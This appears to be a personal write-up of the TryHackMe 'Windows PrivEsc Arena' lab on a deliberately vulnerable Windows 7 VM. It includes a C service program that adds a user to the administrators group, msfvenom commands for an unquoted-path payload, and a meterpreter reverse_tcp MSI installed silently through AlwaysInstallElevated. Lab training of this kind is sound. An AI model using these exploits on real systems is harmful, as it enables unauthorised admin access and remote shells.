# THM - Windows PrivEsc Arena

Students will learn how to escalate privileges using a very vulnerable Windows 7 VM. RDP is open. Your credentials are user:password321

<figure><img src="../../../../.gitbook/assets/image (353).png" alt=""><figcaption></figcaption></figure>

connect rdp

```bash
rdesktop 10.10.50.130 -g 95%
```

PowerUp

```powershell
powershell.exe -ep bypass 
import-module powerup.p1
invoke-AllChecks
```

<figure><img src="../../../../.gitbook/assets/image (354).png" alt=""><figcaption></figcaption></figure>

```
lcacls.exe <path.exe>
```

<figure><img src="../../../../.gitbook/assets/image (355).png" alt=""><figcaption><p>"C:\Program Files\File Permissions Service\filepermservice.exe"</p></figcaption></figure>

Code C to make privesc in win7

### Service Escalation - Registry

#### Detection

```powershell
 Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
```

<figure><img src="../../../../.gitbook/assets/image (361).png" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
Notice that the output suggests that user belong to “**NT** **AUTHORITY**\\**INTERACTIVE**” has “**FullContol**” permission over the registry key.
{% endhint %}

#### Exploitation

```c
#include <windows.h>
#include <stdio.h>

#define SLEEP_TIME 5000

SERVICE_STATUS ServiceStatus; 
SERVICE_STATUS_HANDLE hStatus; 
 
void ServiceMain(int argc, char** argv); 
void ControlHandler(DWORD request); 

//add the payload here
int Run() 
{ 
    system("cmd.exe /k net localgroup administrators user /add");
    return 0; 
} 

int main() 
{ 
    SERVICE_TABLE_ENTRY ServiceTable[2];
    ServiceTable[0].lpServiceName = "MyService";
    ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;

    ServiceTable[1].lpServiceName = NULL;
    ServiceTable[1].lpServiceProc = NULL;
 
    StartServiceCtrlDispatcher(ServiceTable);  
    return 0;
}

void ServiceMain(int argc, char** argv) 
{ 
    ServiceStatus.dwServiceType        = SERVICE_WIN32; 
    ServiceStatus.dwCurrentState       = SERVICE_START_PENDING; 
    ServiceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    ServiceStatus.dwWin32ExitCode      = 0; 
    ServiceStatus.dwServiceSpecificExitCode = 0; 
    ServiceStatus.dwCheckPoint         = 0; 
    ServiceStatus.dwWaitHint           = 0; 
 
    hStatus = RegisterServiceCtrlHandler("MyService", (LPHANDLER_FUNCTION)ControlHandler); 
    Run(); 
    
    ServiceStatus.dwCurrentState = SERVICE_RUNNING; 
    SetServiceStatus (hStatus, &ServiceStatus);
 
    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
    {
        Sleep(SLEEP_TIME);
    }
    return; 
}

void ControlHandler(DWORD request) 
{ 
    switch(request) 
    { 
        case SERVICE_CONTROL_STOP: 
            ServiceStatus.dwWin32ExitCode = 0; 
            ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
            SetServiceStatus (hStatus, &ServiceStatus);
            return; 
 
        case SERVICE_CONTROL_SHUTDOWN: 
            ServiceStatus.dwWin32ExitCode = 0; 
            ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
            SetServiceStatus (hStatus, &ServiceStatus);
            return; 
        
        default:
            break;
    } 
    SetServiceStatus (hStatus,  &ServiceStatus);
    return; 
}
```

```powershell
sc start filepermsvc
```

<figure><img src="../../../../.gitbook/assets/image (356).png" alt=""><figcaption></figcaption></figure>

To Delete user from group

```powershell
net localgroup Administrators user /DELETE 
```

Escalation va Unquoted Path

```bash
msfvenom -p windows/exec CMD='net localgroup Administrators user /add ' -f exe -o /home/h3ckt0r/tool/privesc/common.exe
updog -p 8080
```

<figure><img src="../../../../.gitbook/assets/image (357).png" alt=""><figcaption><p>nqoted path</p></figcaption></figure>

### Registry Escalation - AlwaysInstallElevated

> 1.Open command prompt and type: **reg query**\
> **HKLM\Software\Policies\Microsoft\Windows\Installer** \
> 2.From the output, notice that “**AlwaysInstallElevated**” value is **1**
>
> <img src="../../../../.gitbook/assets/image (359).png" alt="" data-size="original">

{% code overflow="wrap" %}
```
 msfvenom -p windows/meterpreter/reverse_tcp lhost=10.9.0.213 -f msi -o setup.msi
```
{% endcode %}

1.Place ‘setup.msi’ in ‘C:\\**Temp**’.\
2.Open command prompt and type: **msiexec /quiet /qn /i C:\Temp\setup.msi**

<figure><img src="../../../../.gitbook/assets/image (360).png" alt=""><figcaption></figcaption></figure>

### Service Escalation - Executable Files



<figure><img src="../../../../.gitbook/assets/image (362).png" alt=""><figcaption></figcaption></figure>

Service Escalation - DLL Hijacking



<figure><img src="../../../../.gitbook/assets/image (363).png" alt=""><figcaption></figcaption></figure>
